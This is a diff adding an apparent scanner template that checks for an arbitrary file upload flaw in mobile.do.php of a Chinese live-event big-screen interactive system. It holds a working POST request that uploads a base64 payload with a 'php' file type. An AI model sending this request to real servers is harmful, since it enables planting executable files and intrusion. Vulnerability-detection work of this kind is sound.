@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 金华迪加现场大屏互动系统mobile.do.php任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /mobile/mobile.do.php?action=msg_uploadimg
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+    Connection: close
+  data: |
+    filetype=php&imgbase64=MTIzNDU2
+response1:
+  body: picurl
+  code: 200
+requests2:
+response2:
